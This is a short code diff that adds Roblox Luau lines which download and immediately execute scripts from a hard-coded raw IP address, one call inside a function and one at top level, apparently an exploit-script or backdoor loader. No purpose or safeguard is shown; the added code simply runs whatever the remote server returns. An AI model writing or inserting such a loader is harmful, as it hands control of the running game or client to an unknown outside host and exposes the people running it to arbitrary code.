@@ -1,0 +1,5 @@
+local function vis()
+  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
+end
+ID="48894c94-2cea-4e4f-a8b5-f9c6a9e147f5";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
